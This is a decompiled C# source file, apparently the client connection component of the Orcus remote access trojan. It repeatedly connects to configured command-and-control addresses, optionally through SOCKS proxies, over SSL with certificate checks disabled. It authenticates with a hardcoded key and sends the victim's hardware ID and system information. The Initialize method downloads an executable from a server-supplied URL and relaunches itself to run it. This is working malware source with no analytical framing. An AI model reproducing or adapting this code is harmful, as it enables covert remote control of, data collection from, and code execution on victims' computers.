using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using Orcus.Config;
using Orcus.Core;
using Orcus.Plugins;
using Orcus.Shared.Connection;
using Orcus.Shared.Core;
using Orcus.Shared.Settings;
using Orcus.Shared.Utilities;
using Orcus.Utilities;
using Starksoft.Aspen.Proxy;

namespace Orcus.Connection;

public class Client : IDisposable, IClientInfo
{
	private delegate bool TryConnectDelegate(out TcpClient tcpClient, out SslStream stream, IpAddressInfo ipAddressInfo);

	private readonly Random _random = new Random();

	private bool _isDisposed;

	public bool IsConnected { get; set; }

	public bool IsSearching { get; set; }

	public ServerConnection Connection { get; set; }

	IServerConnection ServerConnection => (IServerConnection)(object)Connection;

	IClientOperator ClientOperator => (IClientOperator)(object)ClientOperator.Instance;

	public event EventHandler Connected;

	public event EventHandler Disconnected;

	public void Dispose()
	{
		_isDisposed = true;
		IsSearching = false;
		Connection?.Dispose();
	}

	public void BeginConnect()
	{
		IsSearching = true;
		Thread thread = new Thread(Connect);
		thread.IsBackground = true;
		thread.Start();
	}

	public void StopConnect()
	{
		IsSearching = false;
	}

	private void Connect()
	{
		List<IpAddressInfo> ipAddresses = Settings.GetBuilderProperty<ConnectionBuilderProperty>().get_IpAddresses();
		int num = 0;
		while (IsSearching)
		{
			bool flag = false;
			foreach (ClientController clientPlugin in PluginLoader.Current.ClientPlugins)
			{
				try
				{
					if (!clientPlugin.CanTryConnect())
					{
						flag = true;
						break;
					}
				}
				catch (Exception exception)
				{
					ErrorReporter.Current.ReportError(exception, string.Concat("CanStart() at plugin: \"", ((object)clientPlugin).GetType(), "\""));
				}
			}
			if (!flag)
			{
				TcpClient tcpClient = null;
				SslStream stream = null;
				BinaryReader binaryReader = null;
				BinaryWriter binaryWriter = null;
				try
				{
					if (num >= ipAddresses.Count)
					{
						num = 0;
					}
					TryConnectDelegate tryConnectDelegate = TryConnect;
					ClientController val = ((IEnumerable<ClientController>)PluginLoader.Current.ClientPlugins).FirstOrDefault((Func<ClientController, bool>)((ClientController x) => x.get_OverwriteTryConnect()));
					if (val != null)
					{
						tryConnectDelegate = val.TryConnect;
					}
					if (tryConnectDelegate(out tcpClient, out stream, ipAddresses[num]))
					{
						num = 0;
						binaryWriter = new BinaryWriter(stream);
						binaryReader = new BinaryReader(stream);
						if (!Initialize(binaryWriter, binaryReader, out var fileName))
						{
							stream.Dispose();
							tcpClient.Close();
							if (fileName != null)
							{
								Program.Unload();
								Process.Start(new ProcessStartInfo(Process.GetCurrentProcess().MainModule!.FileName)
								{
									Arguments = $"/wait /upgrade \"{fileName}\""
								});
								Program.Exit();
							}
						}
						if (Authenticate(binaryReader, binaryWriter))
						{
							InformationCollector.SendInformation(stream);
							IsConnected = true;
							StopConnect();
							Connection = new ServerConnection(tcpClient, stream, binaryReader, binaryWriter, ClientOperator.Instance.DatabaseConnection, (IClientInfo)(object)this);
							Connection.Disconnected += Connection_Disconnected;
							this.Connected?.Invoke(this, EventArgs.Empty);
							break;
						}
					}
					else
					{
						num++;
					}
				}
				catch (Exception)
				{
				}
				binaryReader?.Close();
				binaryWriter?.Close();
				stream?.Dispose();
				tcpClient?.Close();
			}
			Thread.Sleep(Settings.GetBuilderProperty<ReconnectDelayProperty>().get_Delay() + _random.Next(1, 340));
		}
	}

	private void Connection_Disconnected(object sender, EventArgs e)
	{
		if (!_isDisposed)
		{
			this.Disconnected?.Invoke(this, EventArgs.Empty);
			Thread.Sleep(Settings.GetBuilderProperty<ReconnectDelayProperty>().get_Delay() + _random.Next(1, 340));
			BeginConnect();
		}
	}

	private bool Initialize(BinaryWriter binaryWriter, BinaryReader binaryReader, out string fileName)
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Invalid comparison between Unknown and I4
		fileName = null;
		binaryWriter.Write((byte)0);
		binaryWriter.Write(5);
		PrimitiveProtocol val = (PrimitiveProtocol)binaryReader.ReadByte();
		if ((int)val != 0)
		{
			if ((int)val != 1)
			{
				return false;
			}
			string @string = Encoding.UTF8.GetString(binaryReader.ReadBytes(binaryReader.ReadInt32()));
			string freeTempFileName = FileExtensions.GetFreeTempFileName("exe");
			using (WebClient webClient = new WebClient())
			{
				webClient.DownloadFile(@string, freeTempFileName);
			}
			fileName = freeTempFileName;
			return false;
		}
		return true;
	}

	private static bool TryConnect(out TcpClient tcpClient, out SslStream stream, IpAddressInfo ipAddressInfo)
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Invalid comparison between Unknown and I4
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005b: Expected O, but got Unknown
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c3: Expected O, but got Unknown
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d5: Expected O, but got Unknown
		tcpClient = null;
		stream = null;
		TcpClient tcpClient2 = null;
		try
		{
			ProxyBuilderProperty builderProperty = Settings.GetBuilderProperty<ProxyBuilderProperty>();
			if ((int)builderProperty.get_ProxyOption() != 0)
			{
				if ((int)builderProperty.get_ProxyOption() == 1)
				{
					ProxyHelper.GetSystemProxy(out var ipAddress, out var port);
					for (int i = 0; i < 3; i++)
					{
						try
						{
							IProxyClient val = (IProxyClient)(i switch
							{
								0 => (object)new Socks4ProxyClient(), 
								1 => (object)new Socks4aProxyClient(), 
								2 => (object)new Socks5ProxyClient(), 
								_ => throw new ArgumentException(), 
							});
							val.set_ProxyHost(ipAddress);
							val.set_ProxyPort(port);
							tcpClient2 = val.CreateConnection(ipAddressInfo.get_Ip(), ipAddressInfo.get_Port());
						}
						catch (Exception)
						{
							continue;
						}
						break;
					}
				}
				else
				{
					IProxyClient val2 = (IProxyClient)(builderProperty.get_ProxyType() switch
					{
						0 => (object)new Socks4ProxyClient(), 
						1 => (object)new Socks4aProxyClient(), 
						2 => (object)new Socks5ProxyClient(), 
						_ => throw new ArgumentException(), 
					});
					val2.set_ProxyHost(builderProperty.get_ProxyAddress());
					val2.set_ProxyPort(builderProperty.get_ProxyPort());
					tcpClient2 = val2.CreateConnection(ipAddressInfo.get_Ip(), ipAddressInfo.get_Port());
				}
			}
		}
		catch (Exception)
		{
		}
		if (tcpClient2 == null)
		{
			tcpClient2 = new TcpClient();
			try
			{
				IAsyncResult asyncResult = tcpClient2.BeginConnect(ipAddressInfo.get_Ip(), ipAddressInfo.get_Port(), null, null);
				if (!asyncResult.AsyncWaitHandle.WaitOne(3000, exitContext: false))
				{
					return false;
				}
				tcpClient2.EndConnect(asyncResult);
			}
			catch (Exception)
			{
				return false;
			}
		}
		SslStream sslStream = new SslStream(tcpClient2.GetStream(), leaveInnerStreamOpen: false, UserCertificateValidationCallback);
		try
		{
			string machineName = Environment.MachineName;
			sslStream.AuthenticateAsClient(machineName);
		}
		catch (AuthenticationException)
		{
			sslStream.Dispose();
			tcpClient2.Close();
			return false;
		}
		tcpClient = tcpClient2;
		stream = sslStream;
		return true;
	}

	private static bool UserCertificateValidationCallback(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
	{
		return true;
	}

	internal bool Authenticate(BinaryReader binaryReader, BinaryWriter binaryWriter)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		if (binaryReader.ReadByte() != 0)
		{
			return false;
		}
		int num = binaryReader.ReadInt32();
		KeyDatabase val = new KeyDatabase();
		binaryWriter.Write(val.GetKey(num, "@=<VY]BUQM{sp&hH%xbLJcUd/2sWgR+YA&-_Z>/$skSXZR!:(yZ5!>t>ZxaPTrS[Z/'R,ssg'.&4yZN?S)My+:QV2(c&x/TU]Yq2?g?*w7*r@pmh"));
		if (binaryReader.ReadByte() != 6)
		{
			return false;
		}
		binaryWriter.Write(InformationCollector.GetHardwareId());
		byte b = binaryReader.ReadByte();
		if (b == 7)
		{
			binaryWriter.Write(Settings.GetBuilderProperty<ClientTagBuilderProperty>().get_ClientTag());
			b = binaryReader.ReadByte();
		}
		return b == 3;
	}
}
